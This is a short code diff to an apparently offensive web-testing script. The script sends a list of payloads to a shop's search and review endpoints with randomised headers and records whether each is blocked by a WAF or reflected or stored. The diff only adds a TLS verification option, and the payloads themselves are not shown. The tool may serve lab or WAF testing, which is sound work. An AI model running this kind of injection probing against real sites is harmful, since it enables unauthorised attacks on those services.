@@ -5,7 +5,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 import requests
-from config import SHOP_URL, LOGS_DIR
+from config import SHOP_URL, LOGS_DIR, TLS_VERIFY
 from utils import print_banner, print_request, jitter, random_headers, SessionLog
 
 PAYLOADS = [
@@ -48,7 +48,7 @@ def run() -> dict:
     for payload in PAYLOADS:
         url = f"{SHOP_URL}/search"
         try:
-            r = requests.get(url, params={"q": payload}, headers=random_headers(), timeout=10)
+            r = requests.get(url, params={"q": payload}, headers=random_headers(), timeout=10, verify=TLS_VERIFY)
             note = "WAF block" if r.status_code == 403 else "reflected"
             print_request("GET", f"{url}?q={payload[:35]}...", r.status_code, note)
             log.log("GET", url, r.status_code, payload, note)
@@ -65,7 +65,7 @@ def run() -> dict:
         url = f"{SHOP_URL}/reviews"
         try:
             r = requests.post(url, data={"product_id": "1", "review": payload},
-                              headers=random_headers(), timeout=10)
+                              headers=random_headers(), timeout=10, verify=TLS_VERIFY)
             note = "WAF block" if r.status_code == 403 else "stored"
             print_request("POST", url, r.status_code, f"review={payload[:30]}...")
             log.log("POST", url, r.status_code, payload, note)
